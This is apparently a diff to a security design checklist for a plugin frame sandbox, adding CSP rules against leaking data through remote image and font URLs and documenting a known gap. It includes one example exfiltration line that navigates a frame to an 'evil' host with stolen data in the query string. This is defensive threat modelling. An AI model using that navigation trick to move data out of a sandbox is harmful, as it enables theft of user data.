@@ -77,6 +77,13 @@ afterCommit hooks and three unrelated webhook proposals. Plugin state
 - [ ] Integration-proxy requests from frames go through the host (a
       `proxyFetch` host op restricted to the minted capability's origin)
       instead of a direct `fetch` from the frame.
+- [ ] `img-src 'self' data: blob:` and `font-src 'self' data:`: a remote
+      image or font URL can carry data in its query string.
+- Known gap: a frame can navigate itself (`location = 'https://evil/?' +
+  data`). No CSP directive blocks a document navigating itself
+  (`navigate-to` was dropped from CSP). Closing it needs the frame to hold no
+  data worth stealing without the host (later steps), or a host-side
+  watchdog that tears down a frame whose document changed.
 
 ### 1. One host ABI (pre-v1)
 
